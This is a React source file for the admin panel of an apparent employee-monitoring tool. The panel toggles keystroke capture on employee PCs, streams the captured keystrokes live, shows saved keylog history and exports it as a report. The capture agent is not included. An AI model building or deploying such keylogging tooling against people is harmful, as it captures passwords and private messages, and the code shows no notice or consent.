import React, { useState, useEffect, useRef } from 'react';
import { Keyboard, Eye, EyeOff, Trash2, Download, Circle, History, RefreshCw } from 'lucide-react';
import useStore from '../store';
import { toast } from 'react-hot-toast';

const Keylogger = ({ socket }) => {
    const { employees } = useStore();
    const [keylogEnabled, setKeylogEnabled] = useState(false);
    const [selectedEmployee, setSelectedEmployee] = useState('all');
    const [liveLog, setLiveLog] = useState({}); // { socketId: [{ text, timestamp, name }] }
    const [showLive, setShowLive] = useState(true);
    const [historyLogs, setHistoryLogs] = useState([]);
    const [viewMode, setViewMode] = useState('live'); // 'live' or 'history'
    const [loadingHistory, setLoadingHistory] = useState(false);
    const logEndRef = useRef(null);

    const onlineEmployees = employees.filter(e => e.status === 'online');

    const fetchSettings = async () => {
        try {
            const BACKEND_URL = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1'
              ? 'http://localhost:5000'
              : 'https://ayush-eye-1.onrender.com';
            const token = localStorage.getItem('token');
            const response = await fetch(`${BACKEND_URL}/api/admin/settings`, {
                headers: { 'Authorization': `Bearer ${token}` }
            });
            if (response.ok) {
                const data = await response.json();
                setKeylogEnabled(data.keylogEnabled === true);
            }
        } catch (err) {
            console.error('Failed to fetch settings:', err);
        }
    };

    const fetchHistory = async () => {
        setLoadingHistory(true);
        try {
            const BACKEND_URL = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1'
              ? 'http://localhost:5000'
              : 'https://ayush-eye-1.onrender.com';
            const token = localStorage.getItem('token');
            const response = await fetch(`${BACKEND_URL}/api/admin/keylogs`, {
                headers: { 'Authorization': `Bearer ${token}` }
            });
            if (response.ok) {
                const data = await response.json();
                setHistoryLogs(data);
            }
        } catch (err) {
            console.error('Failed to fetch keylogs:', err);
        } finally {
            setLoadingHistory(false);
        }
    };

    useEffect(() => {
        fetchSettings();
        fetchHistory();
    }, []);

    useEffect(() => {
        if (!socket) return;

        const handleKeylogLive = ({ socketId, employeeName, text, timestamp }) => {
            setLiveLog(prev => {
                const existing = prev[socketId] || [];
                return {
                    ...prev,
                    [socketId]: [...existing.slice(-200), { text, timestamp, name: employeeName }] // Keep last 200 batches
                };
            });
            if (logEndRef.current) {
                logEndRef.current.scrollIntoView({ behavior: 'smooth' });
            }
            // Auto refresh history in background
            fetchHistory();
        };

        socket.on('keylog_live', handleKeylogLive);
        return () => socket.off('keylog_live', handleKeylogLive);
    }, [socket]);

    const toggleKeylog = () => {
        const newEnabled = !keylogEnabled;
        setKeylogEnabled(newEnabled);
        if (socket) {
            socket.emit('toggle_keylog', {
                enabled: newEnabled,
                employeeSocketId: selectedEmployee !== 'all' ? selectedEmployee : null
            });
        }
        toast.success(newEnabled ? '⌨️ Keylogger ENABLED' : '⌨️ Keylogger DISABLED');
    };

    const clearLog = () => {
        setLiveLog({});
        toast.success('Keylog cleared');
    };

    const downloadLog = () => {
        let content = `SENTINEL KEYLOGGER REPORT\nGenerated: ${new Date().toLocaleString()}\n${'='.repeat(60)}\n\n`;
        Object.entries(liveLog).forEach(([socketId, entries]) => {
            const name = entries[0]?.name || socketId;
            content += `\n[${name}]\n`;
            entries.forEach(e => {
                content += `[${new Date(e.timestamp).toLocaleTimeString()}] ${e.text}\n`;
            });
        });
        const blob = new Blob([content], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `Keylog_${new Date().toISOString().split('T')[0]}.txt`;
        a.click();
        URL.revokeObjectURL(url);
    };

    const displayLog = selectedEmployee === 'all'
        ? Object.entries(liveLog)
        : Object.entries(liveLog).filter(([id]) => id === selectedEmployee);

    const filteredHistory = selectedEmployee === 'all'
        ? historyLogs
        : historyLogs.filter(log => {
            const emp = employees.find(e => e.socketId === selectedEmployee);
            return emp ? log.employeeId === emp.id : log.employeeId === selectedEmployee;
        });

    return (
        <div className="space-y-6">
            {/* Header Controls */}
            <div className="bg-[#1e293b] rounded-2xl border border-slate-700/50 p-5">
                <div className="flex flex-wrap items-center justify-between gap-4">
                    <div className="flex items-center gap-3">
                        <div className={`p-3 rounded-xl ${keylogEnabled ? 'bg-red-500/20 text-red-400' : 'bg-slate-700/50 text-slate-500'}`}>
                            <Keyboard size={22} />
                        </div>
                        <div>
                            <h3 className="font-bold text-white">Keylogger</h3>
                            <p className="text-xs text-slate-500">Captures all keystrokes from employee PCs</p>
                        </div>
                    </div>

                    <div className="flex items-center gap-3">
                        {/* Employee Filter */}
                        <select
                            value={selectedEmployee}
                            onChange={e => setSelectedEmployee(e.target.value)}
                            className="bg-slate-900 border border-slate-700 text-slate-200 text-sm rounded-xl px-3 py-2 outline-none focus:border-blue-500"
                        >
                            <option value="all">All Employees</option>
                            {onlineEmployees.map(emp => (
                                <option key={emp.socketId} value={emp.socketId}>{emp.name} ({emp.pcName})</option>
                            ))}
                        </select>

                        {/* Enable/Disable Toggle */}
                        <button
                            onClick={toggleKeylog}
                            className={`flex items-center gap-2 px-4 py-2 rounded-xl text-sm font-bold transition-all ${
                                keylogEnabled
                                    ? 'bg-red-600 hover:bg-red-500 text-white shadow-lg shadow-red-600/30'
                                    : 'bg-slate-700 hover:bg-slate-600 text-slate-300'
                            }`}
                        >
                            {keylogEnabled ? <><Circle size={10} className="fill-current animate-pulse" /> RECORDING</> : 'Start Keylog'}
                        </button>

                        {/* Clear */}
                        <button onClick={clearLog} className="p-2 bg-slate-800 text-slate-400 hover:text-red-400 rounded-xl border border-slate-700">
                            <Trash2 size={16} />
                        </button>

                        {/* Download */}
                        <button onClick={downloadLog} className="p-2 bg-slate-800 text-slate-400 hover:text-emerald-400 rounded-xl border border-slate-700">
                            <Download size={16} />
                        </button>

                        {/* Show/Hide Live */}
                        <button onClick={() => setShowLive(!showLive)} className="p-2 bg-slate-800 text-slate-400 hover:text-blue-400 rounded-xl border border-slate-700">
                            {showLive ? <Eye size={16} /> : <EyeOff size={16} />}
                        </button>
                    </div>
                </div>

                {keylogEnabled && (
                    <div className="mt-3 flex items-center gap-2 text-xs text-red-400">
                        <Circle size={8} className="fill-current animate-pulse" />
                        Keylogger is active — capturing keystrokes from {selectedEmployee === 'all' ? 'all employees' : 'selected employee'}
                    </div>
                )}
            </div>

            {/* Tabs for Feed Selection */}
            <div className="flex border-b border-slate-700/50">
                <button
                    onClick={() => setViewMode('live')}
                    className={`px-6 py-3 text-sm font-semibold flex items-center gap-2 border-b-2 transition-all ${
                        viewMode === 'live'
                            ? 'border-blue-500 text-blue-400'
                            : 'border-transparent text-slate-400 hover:text-slate-200'
                    }`}
                >
                    <Circle size={8} className={keylogEnabled ? 'fill-red-500 text-red-500 animate-pulse' : 'fill-slate-500 text-slate-500'} />
                    Live Keystroke Feed
                </button>
                <button
                    onClick={() => {
                        setViewMode('history');
                        fetchHistory();
                    }}
                    className={`px-6 py-3 text-sm font-semibold flex items-center gap-2 border-b-2 transition-all ${
                        viewMode === 'history'
                            ? 'border-blue-500 text-blue-400'
                            : 'border-transparent text-slate-400 hover:text-slate-200'
                    }`}
                >
                    <History size={14} />
                    Saved History Log
                </button>
            </div>

            {/* Live Keylog Display */}
            {viewMode === 'live' && showLive && (
                <div className="bg-[#0f172a] rounded-2xl border border-slate-700/50 overflow-hidden">
                    <div className="px-5 py-3 bg-slate-800/50 border-b border-slate-700/50 flex items-center justify-between">
                        <span className="text-sm font-semibold text-slate-300">Live Keystroke Feed</span>
                        <span className="text-xs text-slate-500">{Object.values(liveLog).flat().length} entries captured</span>
                    </div>
                    <div className="p-5 space-y-4 max-h-[500px] overflow-y-auto font-mono">
                        {displayLog.length === 0 ? (
                            <div className="text-center py-12 text-slate-600">
                                <Keyboard size={40} className="mx-auto mb-3 opacity-30" />
                                <p>No keystrokes captured yet.</p>
                                <p className="text-xs mt-1">Enable keylogger and wait for employee activity.</p>
                            </div>
                        ) : (
                            displayLog.map(([socketId, entries]) => (
                                <div key={socketId} className="space-y-2">
                                    <div className="text-xs font-bold text-blue-400 uppercase tracking-widest border-b border-slate-800 pb-1">
                                        👤 {entries[0]?.name || socketId}
                                    </div>
                                    <div className="space-y-1">
                                        {entries.map((entry, i) => (
                                            <div key={i} className="flex gap-3 text-xs">
                                                <span className="text-slate-600 flex-shrink-0">
                                                    {new Date(entry.timestamp).toLocaleTimeString()}
                                                </span>
                                                <span className="text-emerald-300 break-all whitespace-pre-wrap">{entry.text}</span>
                                            </div>
                                        ))}
                                    </div>
                                </div>
                             ))
                        )}
                        <div ref={logEndRef} />
                    </div>
                </div>
            )}

            {/* Saved History Log Display */}
            {viewMode === 'history' && (
                <div className="bg-[#0f172a] rounded-2xl border border-slate-700/50 overflow-hidden">
                    <div className="px-5 py-3 bg-slate-800/50 border-b border-slate-700/50 flex items-center justify-between">
                        <span className="text-sm font-semibold text-slate-300">Saved History Log</span>
                        <button 
                            onClick={fetchHistory}
                            disabled={loadingHistory}
                            className="p-1.5 hover:bg-slate-700 rounded-lg text-slate-400 hover:text-slate-200 transition-all flex items-center gap-1.5 text-xs"
                        >
                            <RefreshCw size={12} className={loadingHistory ? 'animate-spin' : ''} />
                            Refresh
                        </button>
                    </div>
                    <div className="p-5 space-y-4 max-h-[500px] overflow-y-auto font-mono">
                        {loadingHistory ? (
                            <div className="text-center py-12 text-slate-500">
                                <RefreshCw size={30} className="mx-auto mb-3 animate-spin opacity-50" />
                                <p>Loading saved keylogs...</p>
                            </div>
                        ) : filteredHistory.length === 0 ? (
                            <div className="text-center py-12 text-slate-600">
                                <History size={40} className="mx-auto mb-3 opacity-30" />
                                <p>No saved keylogs found in history.</p>
                                <p className="text-xs mt-1">Keystrokes are saved to history when a batch is received.</p>
                            </div>
                        ) : (
                            <div className="space-y-4">
                                {filteredHistory.map((logItem) => (
                                    <div key={logItem._id} className="p-4 bg-[#1e293b]/30 border border-slate-800 rounded-xl space-y-2">
                                        <div className="flex justify-between items-center text-xs border-b border-slate-800/80 pb-1.5">
                                            <span className="font-bold text-blue-400">👤 {logItem.employeeName} ({logItem.pcName})</span>
                                            <span className="text-slate-500">{new Date(logItem.timestamp).toLocaleString()}</span>
                                        </div>
                                        <p className="text-xs text-emerald-300 break-all whitespace-pre-wrap">{logItem.text}</p>
                                    </div>
                                ))}
                            </div>
                        )}
                    </div>
                </div>
            )}
        </div>
    );
};

export default Keylogger;
